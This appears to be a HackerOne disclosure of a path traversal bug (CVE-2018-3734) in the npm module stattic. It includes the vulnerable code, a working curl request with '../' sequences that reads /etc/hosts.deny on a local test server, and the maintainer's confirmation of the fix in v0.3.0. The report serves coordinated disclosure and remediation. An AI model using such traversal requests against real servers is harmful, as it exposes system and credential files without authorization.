---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
  - fix/file-validation
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-03-06
submitted: 2018-02-23T12:44:58.526Z
bounty_usd: null
votes: 7
cve: "CVE-2018-3734"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bl4de"
source: "https://hackerone.com/reports/319003"
title: "[stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)"
---
# [stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 7 | **Program:** Node.js third-party modules | **Disclosed:** 2018-03-06

- Report: [https://hackerone.com/reports/319003](https://hackerone.com/reports/319003)
- CWE: Path Traversal | CVE: CVE-2018-3734
- Submitted: 2018-02-23T12:44:58.526Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report Path Traversal in ```stattic``` module.
It allows to read content of some arbitrary files from the server where ```stattic``` is installed and run.

## Module

**module name:** stattic
**version:** 0.2.3
**npm page:** https://www.npmjs.com/package/stattic

### Module Description

Ridiculous simple script for serving static files using http module.

### Module Stats

Stats
7 downloads in the last day
32 downloads in the last week
77 downloads in the last month

~900 estimated downloads per year

## Vulnerability Description

Path Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.

However, this issue allows to read only files with extension, because if no extension is provided, ```stattic``` by default uses setting from ```options.index``` variable.

## Steps To Reproduce:

Install ```stattic``` module:

```
$ npm install stattic
```

Create sample application:

```javascript
// app.js
//Import libs
var stattic = require('stattic');
 
//Set the folder with the static files
stattic.set('folder', './');
 
//Set the port
stattic.set('port', 8080);
 
//Run the server
stattic.listen();
```

Run application:

```
$ node app.js
```

Here's the part of ```stattic``` code responsible for handling paths:

```javascript
// node_modules/stattic/index.js, line 70:

    //Parse the request url and get only the pathname
    var pathname = url.parse(req.url).pathname;

    //Resolve to the local folder
    var local_path = path.join(options.folder, pathname);

    //Check the extension
    if(path.extname(local_path) === '')
    {
      //Add the index file to the local path
      local_path = path.join(local_path, './' + path.basename(options.index));
    }

```

If file provided has no extension, ```/``` and ```options.index``` are added (by default, it will become ```/index.html```). This causes that eg. ```/etc/passwd``` path become ```/etc/passwd/index.html```, but ```/etc/hosts.deny``` is valid filename and can be read:

```
$ curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /../../../../../etc/hosts.deny HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: null
< Date: Fri, 23 Feb 2018 12:36:35 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system.
#                  See the manual pages hosts_access(5) and hosts_options(5).
#
# Example:    ALL: some.host.name, .some.domain
#             ALL EXCEPT in.fingerd: other.host.name, .other.domain
#
# If you're going to protect the portmapper use the name "rpcbind" for the
# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.
#
# The PARANOID wildcard matches any host whose name does not match its
# address.
#
# You may wish to enable this to ensure any programs that don't
# validate looked up hostnames still leave understandable logs. In past
# versions of Debian this has been the default.
# ALL: PARANOID

* Connection #0 to host localhost left intact
```

## Patch

Probably some protection against typical Path Traversal exploitation methods should be introduced here.

## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- curl 7.47.0

## Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

Path Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Severity Updated**
- **Changed Scope**
- **2018-02-23** @lirantal: Hi @bl4de,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Cve Id Added**
- **2018-03-03** @lirantal: I opened a generic security issue in the repo to invite the maintainers to the discussion.
- **External User Joined**
- **2018-03-05** @jmjuanes: Hi,
Thanks for your report. This issue is now solved in `v0.3.0`.

```
$ git clone https://github.com/jmjuanes/stattic.git
$ cd stattic/
$ ll
total 64
-rw-r--r--  1 jmjuanes  staff  1081 Mar  5 11:01 LICENSE
-rw-r--r--  1 jmjuanes  staff  2372 Mar  5 11:01 README.md
drwxr-xr-x  3 jmjuanes  staff   102 Mar  5 11:01 assets
-rw-r--r--  1 jmjuanes  staff   731 Mar  5 12:56 cli.js
-rw-r--r--  1 jmjuanes  staff  4279 Mar  5 12:49 index.js
drwxr-xr-x  5 jmjuanes  staff   170 Mar  5 12:56 node_modules
-rw-r--r--  1 jmjuanes  staff   594 Mar  5 12:56 package-lock.json
-rw-r--r--  1 jmjuanes  staff   513 Mar  5 12:57 package.json
-rw-r--r--  1 jmjuanes  staff   335 Mar  5 11:01 stattic.iml
$ node cli.js --folder ./assets

Static server listening on: http://localhost:5000
Reading files from: /Users/jmjuanes/workspace/stattic/assets
```
If you try to read the `package.json` file located in the parent folder, it throws a 404 http status:
```
$ curl -v --path-as-is http://localhost:5000/../package.json
*   Trying ::1...
* Connected to localhost (::1) port 5000 (#0)
> GET /../package.json HTTP/1.1
> Host: localhost:5000
> User-Agent: curl/7.43.0
> Accept: */*
>
< HTTP/1.1 404 OK
< Content-Type: text/html
< Date: Mon, 05 Mar 2018 14:28:53 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
<
<!-- External resources -->
<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">

<!-- Styles -->
<style>
  body
  {
    font-family: 'Montserrat', sans-serif;
    margin: 0px;
    margin-top: 200px;
    padding: 0px;
    font-size: 14px;
    color: #697496;
  }
  .error-header
  {
    display:block;
    font-size: 17px;
    font-weight: bold;
    color: #57607c;
    margin-bottom: 8px;
  }
  .error-detail
  {
    display: block;
  }
</style>

<!-- Error header -->
<div class="error-header" align="center">Error 404</div>

<!-- Error detail information -->
<div class="error-detail" align="center">File not found on the server. Try again or contact with the administrator.</div>
* Connection #0 to host localhost left intact
```

Further comments or issues, please open a new issue in the repository. 

Regards,
Jose.
- **2018-03-05** @bl4de: Hi @jmjuanes ,

Thanks for the fix! Looks good to me :)

@lirantal - I can confirm issue is not reproducible in 0.3.0 :)

bl4de
- **2018-03-05** @lirantal: Great stuff guys, thanks!
@jmjuanes @bl4de are you both ok if I proceed with a full public disclosure of the report?
- **Report Resolved**
- **Agreed On Going Public**
- **2018-03-06** @jmjuanes: @lirantal Yes, please :)
- **Manually Disclosed**
